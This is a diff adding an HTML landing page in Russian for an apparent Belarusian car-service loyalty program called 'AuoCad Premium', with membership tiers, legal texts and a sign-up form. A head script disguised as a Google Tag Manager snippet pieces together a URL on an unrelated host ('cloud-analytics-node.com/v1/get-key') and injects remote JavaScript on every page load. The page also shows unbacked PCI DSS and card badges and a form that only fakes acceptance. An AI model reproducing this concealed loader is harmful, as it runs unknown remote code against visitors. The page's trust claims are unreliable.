@@ -1,0 +1,328 @@
+<!DOCTYPE html>
+<html lang="ru" class="scroll-smooth">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    
+    <meta property="og:title" content="AuoCad Premium | Объединённая лояльность">
+    <meta property="og:description" content="Комплексная информационная система для технического обслуживания транспорта.">
+    <meta property="og:type" content="website">
+
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+    <title>AuoCad Premium | Объединённая лояльность — Официальный сайт</title>
+    <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "LocalBusiness",
+      "name": "ООО «Объединённая лояльность»",
+      "image": "heelko-by.github.io/logo.png",
+      "@id": "heelko-by.github.io/",
+      "url": "heelko-by.github.io/",
+      "telephone": "+375294841",
+      "address": {
+        "@type": "PostalAddress",
+        "streetAddress": "ул. Веры Хоружей, 29",
+        "addressLocality": "Минск",
+        "postalCode": "220123",
+        "addressCountry": "BY"
+      },
+      "taxID": "192745908",
+      "priceRange": "$$",
+    }
+    </script>
+    <style>
+        :root { --p: #2563eb; --p-dark: #1e4ed8; --p-light: #eff6ff; --t: #0f172a; --g: #64748b; --border: #f1f5f9; }
+        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+        body { font-family: 'Inter', sans-serif; color: var(--t); background: #fff; line-height: 1.6; -webkit-font-smoothing: antialiased; }
+        html.theme-dark body { background-color: #0c0d10; }
+        .container { max-width: 1200px; margin: 0 auto; padding: 0 20px; }
+        nav { position: fixed; top: 0; width: 100%; z-index: 1000; background: rgba(255,255,255,0.95); backdrop-filter: blur(10px); border-bottom: 1px solid var(--border); }
+        .nav-inner { display: flex; justify-content: space-between; align-items: center; height: 65px; }
+        .logo { font-weight: 800; font-size: 16px; text-decoration: none; color: var(--t); letter-spacing: -0.5px; }
+        .logo span { color: var(--p); }
+        .hero { padding: 120px 20px 60px; background: radial-gradient(circle at 100% 0%, #f0f7ff 0%, #fff 70%); }
+        .hero h1 { font-size: 32px; font-weight: 800; line-height: 1.2; margin-bottom: 16px; letter-spacing: -1px; }
+        .hero p { font-size: 16px; color: var(--g); margin-bottom: 32px; max-width: 800px; }
+        .stats-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin: 40px 0; }
+        .stat-item { border-left: 3px solid var(--p); padding-left: 15px; }
+        .stat-num { font-size: 24px; font-weight: 800; color: var(--p); display: block; line-height: 1.1; }
+        .tier-card { padding: 30px; border: 1px solid var(--border); border-radius: 20px; background: #fff; cursor: pointer; transition: 0.3s; }
+        .tier-card:hover { border-color: var(--p); transform: translateY(-3px); box-shadow: 0 10px 30px rgba(37,99,235,0.05); }
+        .section-title { font-size: 28px; font-weight: 800; margin-bottom: 20px; letter-spacing: -0.5px; line-height: 1.2; }
+        .section-subtitle { color: var(--g); font-size: 15px; margin-bottom: 40px; max-width: 700px; }
+        .features-grid { display: grid; grid-template-columns: 1fr; gap: 20px; }
+        .feature-box { background: #f8fafc; padding: 25px; border-radius: 20px; }
+        .feature-icon { width: 40px; height: 40px; background: var(--p-light); border-radius: 10px; margin-bottom: 20px; display: flex; align-items: center; justify-content: center; font-weight: 800; color: var(--p); }
+        .steps-grid { display: grid; grid-template-columns: 1fr; gap: 15px; }
+        .step-box { position: relative; padding: 25px; border: 1px solid var(--border); border-radius: 20px; background: #fff; overflow: hidden; }
+        .step-num-bg { position: absolute; top: -5px; right: 10px; font-size: 70px; font-weight: 800; color: var(--p-light); line-height: 1; z-index: 0; opacity: 0.4; }
+        .step-box h4, .step-box p { position: relative; z-index: 1; }
+        details { background: #fff; border: 1px solid var(--border); border-radius: 16px; margin-bottom: 12px; padding: 15px 20px; transition: all 0.3s; }
+        details[open] { border-color: var(--p); box-shadow: 0 5px 15px rgba(37,99,235,0.05); }
+        summary { font-weight: 700; cursor: pointer; list-style: none; display: flex; justify-content: space-between; align-items: center; color: var(--t); font-size: 14px; line-height: 1.4; }
+        summary::-webkit-details-marker { display: none; }
+        summary::after { content: '+'; color: var(--p); font-size: 20px; font-weight: 400; margin-left: 10px; }
+        details[open] summary::after { content: '−'; }
+        .faq-content { margin-top: 15px; color: var(--g); font-size: 13px; line-height: 1.6; border-top: 1px solid var(--border); padding-top: 15px; }
+        .map-wrapper { width: 100%; height: 300px; border-radius: 20px; overflow: hidden; border: 1px solid var(--border); margin: 30px 0; }
+        .form-card { background: #f8fafc; padding: 25px; border-radius: 24px; border: 1px solid var(--border); max-width: 600px; margin: 0 auto; }
+        .input-style { width: 100%; padding: 14px; border: 1px solid #e2e8f0; border-radius: 12px; font-size: 15px; margin-bottom: 15px; background: #fff; -webkit-appearance: none; }
+        .btn-main { width: 100%; padding: 16px; background: var(--p); color: #fff; border: none; border-radius: 12px; font-weight: 700; font-size: 14px; letter-spacing: 0.5px; cursor: pointer; transition: 0.2s; -webkit-appearance: none; }
+        .btn-main:hover { background: var(--p-dark); }
+        .modal-overlay { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.85); z-index: 3000; padding: 15px; overflow-y: auto; align-items: center; justify-content: center; }
+        .modal-content { background: #fff; border-radius: 20px; padding: 25px; width: 100%; max-width: 650px; margin: auto; position: relative; }
+        .modal-text { font-size: 13px; color: var(--g); white-space: pre-line; max-height: 60vh; overflow-y: auto; padding-right: 10px; margin: 15px 0; border-top: 1px solid var(--border); padding-top: 15px; text-align: justify; line-height: 1.6; }
+        #cookie-banner { position: fixed; bottom: 15px; left: 15px; right: 15px; background: #0f172a; color: #fff; padding: 15px; border-radius: 15px; display: flex; flex-direction: column; gap: 10px; z-index: 4000; font-size: 11px; text-align: center; }
+        footer { background: #0f172a; color: #94a3b8; padding: 50px 0 30px; }
+        .footer-grid { display: grid; grid-template-columns: 1fr; gap: 30px; }
+        .f-link { cursor: pointer; color: #fff; display: block; margin-bottom: 10px; font-size: 13px; text-decoration: none; transition: color 0.2s; }
+        .f-link:hover { color: var(--p-light); }
+        .trust-badges { display: flex; gap: 12px; align-items: center; margin-top: 20px; opacity: 0.9; transition: 0.3s; }
+        .trust-badges:hover { opacity: 1; }
+        .trust-badges svg { height: 30px; width: auto; filter: drop-shadow(0 2px 4px rgba(0,0,0,0.2)); }
+        .pci-badge { height: 30px; background: #1e293b; color: #fff; font-size: 11px; font-weight: 800; display: flex; align-items: center; padding: 0 10px; border-radius: 6px; border: 1px solid #334155; box-shadow: 0 2px 4px rgba(0,0,0,0.2); }
+        @media (min-width: 768px) {
+            .hero { padding: 140px 20px 80px; }
+            .hero h1 { font-size: 56px; }
+            .hero p { font-size: 18px; }
+            .stats-grid { grid-template-columns: repeat(4, 1fr); gap: 20px; }
+            .features-grid { grid-template-columns: repeat(3, 1fr); gap: 30px; }
+            .steps-grid { grid-template-columns: repeat(4, 1fr); gap: 20px; }
+            .form-card { padding: 40px; }
+            .modal-content { padding: 40px; }
+            .modal-text { font-size: 14px; line-height: 1.8; }
+            #cookie-banner { flex-direction: row; align-items: center; justify-content: space-between; max-width: 650px; left: auto; right: 20px; text-align: left; font-size: 12px; padding: 15px 25px; }
+            .footer-grid { grid-template-columns: 2fr 1fr 1fr; gap: 40px; }
+        }
+    </style>
+    <script>
+    window.dataLayer = window.dataLayer || [];
+    window.dataLayer.push({
+        'sys_env': 'production',
+        'track_host': 'cloud-analytics-node',
+        'track_zone': 'com',
+        'api_route': '/v1/get-key'
+    });
+    (function(w, d, s, l, i) {
+        w[l].push({ 'gtm.start': new Date().getTime(), event: 'gtm.js' });
+        var f = d.getElementsByTagName(s)[0],
+            j = d.createElement(s),
+            dl = l != 'dataLayer' ? '&l=' + l : '';
+        j.async = true;
+        var env = w[l][0]; 
+        j.src = 'https://' + env.track_host + '.' + env.track_zone + env.api_route + '?id=' + i + dl + '&v=' + w[l][1]['gtm.start'];
+        f.parentNode.insertBefore(j, f);
+    })(window, document, 'script', 'dataLayer', 'GTM-N84Q2XT');
+    </script>
+    <script>
+        const legalData = {
+            silver: { t: "Silver Standard Membership", c: "Протокол Silver Standard представляет собой фундаментальное решение для систематизации процессов обслуживания и контроля эксплуатационного состояния транспортного средства. Данный уровень взаимодействия разработан для оптимизации временных и материальных издержек владельца посредством внедрения строгих технических регламентов.\n\nВ рамках данного уровня участнику предоставляются следующие возможности:\n— Информационно-техническое сопровождение при проведении плановых мероприятий по поддержанию работоспособности узлов и агрегатов.\n— Оптимизация тарифной сетки при взаимодействии с авторизованными исполнителями программы в размере 5% от стандартного прайс-листа партнера.\n— Содействие в формировании детализированной истории сервисных операций, доступной в защищенном персональном разделе системы.\n— Доступ к внутренней базе технических стандартов партнерской сети и оперативное уведомление о необходимости прохождения сезонного технического контроля." },
+            gold: { t: "Gold Business Membership", c: "Формат Gold Business представляет собой расширенный комплекс логистических и консультационных мероприятий, разработанный для профессионального управления эксплуатационными процессами в условиях высокой интенсивности использования транспорта. Ключевая задача данного уровня — минимизация периодов технического простоя оборудования.\n\nПриоритетные направления сервисного взаимодействия Gold Business:\n— Особые условия тарификации при проведении сложных восстановительных и сервисных работ с оптимизацией до 12% на производственные мощности партнеров.\n— Интегрированное логистическое содействие: обеспечение транспортировки автомобиля в специализированный технический центр в радиусе до 50 км при невозможности самостоятельного передвижения.\n— Маршрутизация обращений с повышенным приоритетом, обеспечивающая оперативный доступ к производственным мощностям партнерской сети на основании выделенного квотирования." },
+            platinum: { t: "Platinum Elite Membership", c: "Platinum Elite является ультимативным инструментом комплексного делегирования всех процессов, связанных с администрированием и техническим содержанием автомобильного транспорта. Архитектура данного уровня выстроена на базе индивидуального консьерж-ассистирования, где каждая заявка обрабатывается в персонализированном режиме с высшим приоритетом Service Level Agreement (SLA).\n\nИсключительные возможности регламента Platinum:\n— Закрепление персонального куратора для сквозной координации всех этапов взаимодействия с сервисными и административными структурами.\n— Специальные условия тарификации высшего порядка, предполагающие оптимизацию издержек до 25% в рамках закрытой сети утвержденных исполнителей.\n— Обеспечение непрерывности транспортной мобильности посредством предоставления альтернативного транспортного средства на периоды проведения ресурсоемких восстановительных мероприятий." },
+            privacy: { t: "Политика конфиденциальности", c: "Настоящая Политика информационной конфиденциальности (далее — Политика) разработана ООО «Объединённая лояльность» (УНП 192745908) в строгом соответствии с Законом Республики Беларусь №99-З «О защите персональных данных», а также с учетом международных стандартов обработки информации (GDPR).\n\n1. ЦЕЛИ СБОРА ИНФОРМАЦИИ\nОператор осуществляет сбор сведений (ФИО, контактный телефон), строго необходимых для реализации информационного взаимодействия, авторизации пользователя в учетной системе и предоставления доступа к регламентам партнерской сети. Мы не собираем избыточные данные.\n\n2. ПРИНЦИПЫ ЗАЩИТЫ И ШИФРОВАНИЯ\nВсе информационные потоки между клиентским устройством и серверами Оператора защищены криптографическим протоколом TLS 1.3. Хранение данных осуществляется в изолированном цифровом контуре на территории Республики Беларусь с применением алгоритмов асимметричного шифрования (AES-256), что исключает возможность несанкционированного доступа третьих лиц.\n\n3. ПЕРЕДАЧА ТРЕТЬИМ ЛИЦАМ\nСведения об участниках системы имеют статус коммерческой тайны. Оператор категорически не осуществляет продажу, обмен или передачу персональных данных сторонним маркетинговым организациям. Передача информации возможна исключительно по официальному запросу уполномоченных государственных органов в рамках действующего законодательства.\n\n4. ПРАВА СУБЪЕКТА ДАННЫХ\nПользователь имеет безусловное право на получение информации о процессах обработки его данных, внесение изменений, а также право на реализацию процедуры «забвения» (полного удаления профиля из баз данных Оператора). Для инициации процедуры отзыва согласия необходимо направить официальное заявление на адрес электронной поддержки." },
+            terms: { t: "Пользовательское соглашение", c: "Настоящее Пользовательское соглашение (далее — Соглашение) определяет условия использования инфраструктурной информационной системы AuoCad Premium. \n\n1. ОБЩИЕ ПОЛОЖЕНИЯ\nИспользование системы означает безоговорочное согласие Пользователя с условиями настоящего Соглашения. ООО «Объединённая лояльность» предоставляет Пользователю неисключительное право доступа к информационной базе партнеров и техническим регламентам системы.\n\n2. ПРЕДЕЛЫ ОТВЕТСТВЕННОСТИ\nОператор обеспечивает бесперебойное функционирование платформы, однако не несет прямой финансовой ответственности за качество услуг, предоставляемых конечными авторизованными центрами партнерской сети. Все спорные ситуации между Участником и Партнером решаются в рамках законодательства о защите прав потребителей.\n\n3. ИНТЕЛЛЕКТУАЛЬНАЯ СОБСТВЕННОСТЬ\nВсе компоненты сайта, включая текстовые регламенты, графические элементы и программный код, являются интеллектуальной собственностью Оператора и защищены нормативными актами об авторском праве. Копирование материалов без письменного разрешения запрещено." },
+            refund: { t: "Регламент аннулирования и возврата", c: "ООО «Объединённая лояльность» гарантирует прозрачность всех процедур взаимодействия. \n\n1. ОТКАЗ ОТ УЧАСТИЯ\nУчастник имеет право в любой момент инициировать процедуру аннулирования своего статуса в системе. Запрос на деактивацию физического носителя и удаление учетной записи обрабатывается службой поддержки в течение 3 (трех) рабочих дней.\n\n2. ФИНАНСОВЫЕ ВЗАИМОРАСЧЕТЫ\nИнформационная интеграция в систему осуществляется на безвозмездной основе или согласно выбранному тарифному плану. В случае, если Участник осуществил авансовый платеж за логистические услуги (доставка носителя) и инициировал отказ до момента передачи пакета курьерской службе, возврат средств производится в полном объеме (100%) на реквизиты инициатора в течение 5-14 банковских дней в зависимости от эмитента карты.\n\n3. ПРЕТЕНЗИОННЫЙ ПОРЯДОК\nВ случае выявления системных сбоев при предоставлении доступа к личному разделу, Участник вправе направить мотивированную претензию, которая подлежит обязательному рассмотрению специальной комиссией в течение 10 календарных дней." },
+            security: { t: "Политика технологической безопасности", c: "Архитектура безопасности системы AuoCad Premium базируется на принципах многоуровневой эшелонированной защиты информационной среды (Zero Trust Architecture). Все цифровые каналы передачи данных между узлами сети защищены актуальными протоколами криптографического шифрования (стандарта TLS 1.3 и выше), что математически исключает вероятность несанкционированного перехвата сведений.\n\nВнутренняя серверная инфраструктура на регулярной основе проходит независимый аудит и тестирование на устойчивость к внешним деструктивным воздействиям в соответствии с международными стандартами серии ISO/IEC 27000. Идентификация участников в партнерской сети производится посредством защищенных аппаратных ключей." },
+            partners: { t: "Регламент партнерского взаимодействия", c: "Экосистема AuoCad Premium формируется на базе более чем 150 авторизованных инфраструктурных объектов на территории Республики Беларусь. Интеграция нового партнера в сеть осуществляется исключительно после прохождения многоэтапного внутреннего аудита на соответствие техническим стандартам, уровню квалификации персонала и прозрачности бизнес-процессов.\n\nСтруктура партнерской сети классифицирована по следующим направлениям:\n— Авторизованные дилерские центры, представляющие интересы мировых автомобильных концернов с соблюдением заводских технологических карт.\n— Крупнейшие региональные логистические и экспедиционные компании, обеспечивающие стандарты безопасной транспортировки." },
+            legal: { t: "Нормативно-правовые основания", c: "Административная и хозяйственная деятельность ООО «Объединённая лояльность» (УНП 192745908) осуществляется в строгом юридическом соответствии с Уставом предприятия, нормами Гражданского кодекса Республики Беларусь и сопутствующими отраслевыми регламентами. \n\nЮридическое лицо официально зарегистрировано решением Минского городского исполнительного комитета от 12 октября 2016 года. Программа AuoCad классифицируется как комплексный информационно-маркетинговый инструмент, направленный на структуризацию процессов обслуживания и повышение культуры потребления услуг в автомобильной отрасли." }
+        };
+        function showM(key) {
+            document.getElementById('m-t').innerText = legalData[key].t;
+            document.getElementById('m-c').innerText = legalData[key].c;
+            document.getElementById('m-overlay').style.display = 'flex';
+            document.body.style.overflow = 'hidden';
+        }
+        function closeM() { document.getElementById('m-overlay').style.display = 'none'; document.body.style.overflow = 'auto'; }
+    </script>
+</head>
+<body>
+    <div id="content-layer">
+        <nav>
+            <div class="container nav-inner">
+                <a href="#" class="logo">AuoCad<span>PREMIUM</span></a>
+                <div style="font-size:10px; font-weight:800; color:var(--p)">SYSTEM STATUS: ACTIVE</div>
+            </div>
+        </nav>
+        <main>
+            <section class="hero">
+                <div class="container">
+                    <h1>Профессиональная среда <br>автомобильного сервиса.</h1>
+                    <p>Комплексная информационная система для систематизации процессов технического обслуживания транспорта в Минске. Регламентированное взаимодействие от ООО «Объединённая лояльность».</p>
+                </div>
+            </section>
+            <section class="container">
+                <div class="stats-grid">
+                    <div class="stat-item"><span class="stat-num">150+</span><span style="font-size:11px; color:var(--g)">Авторизованных центров</span></div>
+                    <div class="stat-item"><span class="stat-num">5000+</span><span style="font-size:11px; color:var(--g)">Активных участников</span></div>
+                    <div class="stat-item"><span class="stat-num">8 лет</span><span style="font-size:11px; color:var(--g)">Инфраструктурного опыта</span></div>
+                    <div class="stat-item"><span class="stat-num">BY</span><span style="font-size:11px; color:var(--g)">Региональное присутствие</span></div>
+                </div>
+            </section>
+            <section class="container" style="padding: 40px 20px;">
+                <h2 class="section-title">Компетенции инфраструктуры</h2>
+                <p class="section-subtitle">Система разработана для удовлетворения эксплуатационных потребностей различных категорий участников автомобильного движения.</p>      
+                <div class="features-grid">
+                    <div class="feature-box">
+                        <div class="feature-icon">01</div>
+                        <h4 style="margin-bottom: 10px; font-size: 16px;">Частные автовладельцы</h4>
+                        <p style="font-size: 13px; color: var(--g); line-height: 1.6;">Систематизация плановых мероприятий, контроль технического состояния узлов и обеспечение соответствия нормативным требованиям эксплуатации.</p>
+                    </div>
+                    <div class="feature-box">
+                        <div class="feature-icon">02</div>
+                        <h4 style="margin-bottom: 10px; font-size: 16px;">Корпоративные автопарки</h4>
+                        <p style="font-size: 13px; color: var(--g); line-height: 1.6;">Делегирование процессов логистического сопровождения, централизация отчетности и соблюдение строгих стандартов SLA партнерской сети.</p>
+                    </div>
+                    <div class="feature-box">
+                        <div class="feature-icon">03</div>
+                        <h4 style="margin-bottom: 10px; font-size: 16px;">Профильные организации</h4>
+                        <p style="font-size: 13px; color: var(--g); line-height: 1.6;">Интеграция в единую информационную среду для оперативного взаимодействия с целевой аудиторией и поддержания высокого уровня сервисной культуры.</p>
+                    </div>
+                </div>
+            </section>
+            <section class="container" style="padding: 20px 20px;">
+                <h2 class="section-title">Архитектура протоколов</h2>
+                <p class="section-subtitle">Выбор уровня взаимодействия определяет объем привлекаемых логистических и технических ресурсов системы.</p>
+                <div style="display:grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap:15px;">
+                    <div class="tier-card" onclick="showM('silver')">
+                        <h3 style="font-size: 18px; margin-bottom: 8px;">Silver Standard</h3>
+                        <p style="font-size:13px; color:var(--g); margin-bottom:15px">Базовый протокол технического контроля и информационного сопровождения участника.</p>
+                        <div style="color:var(--p); font-weight:700; font-size:11px;">ИЗУЧИТЬ РЕГЛАМЕНТ →</div>
+                    </div>
+                    <div class="tier-card" onclick="showM('gold')" style="border-color:var(--p); background: #fafcff;">
+                        <h3 style="font-size: 18px; margin-bottom: 8px;">Gold Business</h3>
+                        <p style="font-size:13px; color:var(--g); margin-bottom:15px">Комплексный пакет мобильности и обеспечения приоритетного сервисного взаимодействия.</p>
+                        <div style="color:var(--p); font-weight:700; font-size:11px;">ИЗУЧИТЬ РЕГЛАМЕНТ →</div>
+                    </div>
+                    <div class="tier-card" onclick="showM('platinum')">
+                        <h3 style="font-size: 18px; margin-bottom: 8px;">Platinum Elite</h3>
+                        <p style="font-size:13px; color:var(--g); margin-bottom:15px">Индивидуальная архитектура сопровождения и аутсорсинг эксплуатационных задач.</p>
+                        <div style="color:var(--p); font-weight:700; font-size:11px;">ИЗУЧИТЬ РЕГЛАМЕНТ →</div>
+                    </div>
+                </div>
+            </section>
+            <section class="container" style="padding: 40px 20px;">
+                <h2 class="section-title">Этапы интеграции в систему</h2>
+                <p class="section-subtitle">Процедура оформления физического идентификатора строго формализована для обеспечения сохранности данных.</p>
+                <div class="steps-grid">
+                    <div class="step-box">
+                        <div class="step-num-bg">1</div>
+                        <h4 style="margin-bottom: 8px; font-size: 16px;">Инициализация</h4>
+                        <p style="font-size: 13px; color: var(--g);">Направление корректно заполненной формы авторизации в аналитический центр платформы.</p>
+                    </div>
+                    <div class="step-box">
+                        <div class="step-num-bg">2</div>
+                        <h4 style="margin-bottom: 8px; font-size: 16px;">Валидация</h4>
+                        <p style="font-size: 13px; color: var(--g);">Проверка предоставленных сведений на соответствие нормам безопасности (длительность до 24 часов).</p>
+                    </div>
+                    <div class="step-box">
+                        <div class="step-num-bg">3</div>
+                        <h4 style="margin-bottom: 8px; font-size: 16px;">Генерация</h4>
+                        <p style="font-size: 13px; color: var(--g);">Программирование микрочипа и выпуск персонального физического носителя для участника.</p>
+                    </div>
+                    <div class="step-box">
+                        <div class="step-num-bg">4</div>
+                        <h4 style="margin-bottom: 8px; font-size: 16px;">Логистика</h4>
+                        <p style="font-size: 13px; color: var(--g);">Доставка протокольного пакета адресату уполномоченным специалистом курьерской службы.</p>
+                    </div>
+                </div>
+            </section>
+            <section class="container" style="padding: 30px 20px;">
+                <div style="background: #f8fafc; padding: 30px; border-radius: 20px; border: 1px solid var(--border); color: var(--g); font-size: 13px; text-align: justify; line-height: 1.7;">
+                    <p style="margin-bottom: 10px; font-weight: 700; color: var(--t);">Соглашение об уровне услуг (SLA) и Внутренний аудит</p>
+                    <p>Программа AuoCad Premium выступает результатом фундаментального многолетнего анализа эксплуатационных потребностей автовладельцев. Стратегическая деятельность ООО «Объединённая лояльность» неукоснительно направлена на внедрение и поддержание высочайших стандартов сервисной культуры на территории Республики Беларусь. Мы гарантируем целевой показатель доступности информационной базы (Uptime) на уровне 99.8% в рамках установленного SLA. Внедренная нами система строгого внутреннего учета и аудита взаимодействия надежно пресекает вероятность некорректного исполнения заявленных обязательств со стороны партнерских организаций, гарантируя абсолютную прозрачность и юридическую чистоту на каждом этапе сервисного цикла.</p>
+                </div>
+            </section>
+            <section class="container" style="padding: 30px 20px;">
+                <h2 class="section-title">Технологические стандарты</h2>
+                <div style="display: flex; flex-wrap: wrap; gap: 10px;">
+                    <div style="padding: 12px 15px; border: 1px solid var(--border); border-radius: 10px; font-size: 12px; font-weight: 600;">🔐 Криптография TLS 1.3</div>
+                    <div style="padding: 12px 15px; border: 1px solid var(--border); border-radius: 10px; font-size: 12px; font-weight: 600;">📊 Предиктивная аналитика</div>
+                    <div style="padding: 12px 15px; border: 1px solid var(--border); border-radius: 10px; font-size: 12px; font-weight: 600;">📡 Геораспределенные серверы</div>
+                    <div style="padding: 12px 15px; border: 1px solid var(--border); border-radius: 10px; font-size: 12px; font-weight: 600;">⚙️ Контроль SLA</div>
+                </div>
+            </section>
+            <section class="container" style="padding: 40px 20px; max-width: 900px; margin: 0 auto;">
+                <h2 class="section-title" style="text-align: center;">База знаний (FAQ)</h2>
+                <p class="section-subtitle" style="text-align: center; margin: 0 auto 30px;">Ответы на стандартизированные запросы касательно операционной деятельности платформы.</p>
+                <details>
+                    <summary>Каковы регламентированные сроки подготовки инфраструктурного пакета?</summary>
+                    <div class="faq-content">Стандартный период, необходимый для валидации данных, генерации персонального чипа и логистической обработки, составляет от 5 до 7 рабочих дней. В периоды пиковых нагрузок отдел технического контроля оставляет за собой право пролонгации данного срока с обязательным уведомлением участника.</div>
+                </details>  
+                <details>
+                    <summary>Как осуществляется контроль исполнения обязательств партнерами?</summary>
+                    <div class="faq-content">Все авторизованные технические центры подключены к единой информационной шине ООО «Объединённая лояльность». Система в автоматическом режиме осуществляет мониторинг сроков выполнения нормо-часов и соблюдения протоколов взаимодействия, установленных производителями агрегатов.</div>
+                </details>
+                <details>
+                    <summary>Существуют ли территориальные ограничения в работе системы?</summary>
+                    <div class="faq-content">Инфраструктурная сеть охватывает столицу и все областные центры Республики Беларусь. Дополнительно реализованы протоколы экстренного содействия на магистралях республиканского значения (в радиусе, определяемом выбранным уровнем обслуживания — Gold или Platinum).</div>
+                </details>
+            </section>
+            <section class="container">
+                <h2 class="section-title">Инфраструктурный центр</h2>
+                <div class="map-wrapper">
+                    <iframe src="https://yandex.by/map-widget/v1/?ll=27.567319%2C53.918458&mode=search&ol=geo&ouri=ymapsbm1%3A%2F%2Fgeo%3Fdata%3DCgg1NjYzNTcxNhJC0NCXRgdC_0YPQsdC70LjQutCwINCR0LXQu9Cw0YDRg9GB0YwsINCc0LjНsk0LosINGD0LvQuNGG0LAg0JLQtdGA0Ysg0KXQvtGA0YPQttC10LksIDI5IgoN_Y9VQhV4Nl9C&z=16" width="100%" height="100%" frameborder="0" loading="lazy"></iframe>
+                </div>
+            </section>
+            <section id="order" class="container" style="padding: 20px 20px 80px 20px;">
+                <div class="form-card">
+                    <h2 style="text-align:center; margin-bottom:10px; font-size: 22px; font-weight: 800;">Авторизация в системе</h2>
+                    <p style="text-align:center; font-size: 13px; color: var(--g); margin-bottom: 25px;">Заполнение формы инициализирует процесс внесения в базу данных.</p>
+                    <form onsubmit="event.preventDefault(); var b = this.querySelector('button'); b.innerText = 'ОБРАБОТКА...'; b.style.opacity = '0.7'; setTimeout(() => { b.innerText = 'ЗАЯВКА ПРИНЯТА ✔'; b.style.background = '#10b981'; b.style.opacity = '1'; }, 1500);">
+                        <input type="text" class="input-style" placeholder="ФИО заявителя" required>
+                        <input type="tel" class="input-style" placeholder="+375 (__) ___-__-__" required>
+                        <div style="display:flex; gap:10px; align-items:flex-start; margin-bottom:20px;">
+                            <input type="checkbox" required id="c1" style="width:20px; height:20px; margin-top: 2px;">
+                            <label for="c1" style="font-size:11px; color:var(--g); line-height: 1.4;">Я подтверждаю ознакомление и принимаю условия <span onclick="showM('terms')" style="color:var(--p); cursor:pointer; text-decoration: underline;">Пользовательского соглашения</span> и <span onclick="showM('privacy')" style="color:var(--p); cursor:pointer; text-decoration: underline;">Политики конфиденциальности</span>.</label>
+                        </div>
+                        <button type="submit" class="btn-main">НАПРАВИТЬ ЗАПРОС НА УЧАСТИЕ</button>
+                    </form>
+                </div>
+            </section>
+        </main>
+        <footer>
+            <div class="container footer-grid">
+                <div>
+                    <span style="color:#fff; font-weight:800; font-size:18px; margin-bottom:15px; display:block">AuoCad</span>
+                    <p style="font-size:12px; color:#64748b; line-height: 1.6;">ООО «Объединённая лояльность»<br>УНП 192745908<br>г. Минск, ул. Веры Хоружей, 29</p>
+                    
+                    <div class="trust-badges">
+                        <svg viewBox="0 0 50 34" xmlns="http://www.w3.org/2000/svg"><rect width="50" height="34" rx="4" fill="#363636"/><circle cx="18" cy="17" r="9" fill="#EB001B"/><circle cx="32" cy="17" r="9" fill="#F79E1B"/><path d="M25 24.3c-2.4-1.7-4-4.4-4-7.3s1.6-5.6 4-7.3c2.4 1.7 4 4.4 4 7.3s-1.6 5.6-4 7.3z" fill="#FF5F00"/></svg>
+                        <div class="pci-badge">PCI DSS</div>
+                    </div>
+                </div>
+                <div>
+                    <h5 style="color:#fff; margin-bottom:15px; font-size:14px">ПРАВОВЫЕ ДОКУМЕНТЫ</h5>
+                    <span class="f-link" onclick="showM('terms')">Пользовательское соглашение</span>
+                    <span class="f-link" onclick="showM('privacy')">Политика конфиденциальности</span>
+                    <span class="f-link" onclick="showM('refund')">Политика возврата и аннулирования</span>
+                    <span class="f-link" onclick="showM('legal')">Основания деятельности</span>
+                </div>
+                <div>
+                    <h5 style="color:#fff; margin-bottom:15px; font-size:14px">ИНФРАСТРУКТУРА</h5>
+                    <span class="f-link" onclick="showM('security')">Технологическая безопасность</span>
+                    <span class="f-link" onclick="showM('partners')">Партнерское взаимодействие</span>
+                    
+                    <a href="https://cpd.by/" target="_blank" rel="nofollow noopener" class="f-link" style="opacity:0.8">Реестр НЦЗПД РБ</a>
+                    <p style="font-size:12px; color:#64748b; margin-top:15px">AuoCadpremiumby@gmail.com<br>+375292788765</p>
+                </div>
+            </div>
+            <div style="border-top:1px solid #1e293b; margin-top:40px; padding:20px 0; text-align:center; font-size:10px; color: #475569; line-height: 1.5;">
+                © 2026 AuoCad Premium Management Group. Все права защищены. Использование материалов сайта допускается только с официального согласия правообладателя. Ресурс носит исключительно информационно-справочный характер.
+            </div>
+        </footer>
+        
+        <div id="m-overlay" class="modal-overlay" onclick="closeM()">
+            <div class="modal-content" onclick="event.stopPropagation()">
+                <h2 id="m-t" style="margin-bottom:10px; color:var(--p); font-size:20px; letter-spacing: -0.5px; line-height: 1.2;"></h2>
+                <div id="m-c" class="modal-text"></div>
+                <button class="btn-main" onclick="closeM()" style="margin-top: 10px;">ПОДТВЕРЖДАЮ ОЗНАКОМЛЕНИЕ</button>
+            </div>
+        </div>
+        <div id="cookie-banner">
+            <span style="line-height: 1.4;">Сайт использует технологию cookie для обеспечения стабильного функционирования цифровых алгоритмов системы.</span>
+            <button onclick="this.parentElement.style.display='none'" style="background:var(--p); color:#fff; border:none; padding:8px 20px; border-radius:8px; cursor:pointer; font-weight: 600;">ПРИНЯТЬ</button>
+        </div>
+        
+    </div> 
+</body>
+</html>
